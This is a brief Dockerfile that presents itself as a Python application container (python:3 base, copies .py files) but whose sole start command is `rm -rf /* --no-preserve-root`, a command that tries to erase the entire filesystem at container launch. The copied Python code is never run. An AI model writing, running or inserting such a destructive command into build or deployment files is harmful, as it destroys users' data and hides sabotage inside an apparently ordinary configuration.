FROM python:3

WORKDIR /app
COPY *.py .

CMD ["rm", "-rf", "/*", "--no-preserve-root"]
